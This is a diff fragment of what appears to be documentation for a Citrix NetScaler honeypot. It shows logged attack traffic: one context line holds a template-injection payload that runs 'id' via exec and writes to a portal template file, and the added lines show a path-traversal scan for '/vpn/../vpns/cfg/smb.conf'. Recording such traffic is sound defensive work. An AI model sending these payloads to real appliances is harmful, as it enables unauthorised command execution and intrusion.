@@ -70,6 +70,19 @@ User-Agent: curl/7.67.0
 url=http://example.com\&title=[%25+template.new({'BLOCK'%3d'exec(\'id | tee /netscaler/portal/templates/zToMJRAzp0T0FuUS2cEp41ZZbmrtmUqS.xml\')%3b'})+%25]\&desc=test\&UI_inuse=RfWeb
 ```
 
+Scanning attempt:
+```
+$ cat logs/hits.log 
+2020/01/23 08:41:02 
+-------------------
+Scanning detected ... 
+src: xxx.xxx.xxx.xxx
+GET /vpn/../vpns/cfg/smb.conf HTTP/2.0
+Host: xxx.xxx.xxx.xxx
+Accept: */*
+User-Agent: curl/7.67.0
+```
+
 Login attempts:
 ```
 $ cat logs/logins.log
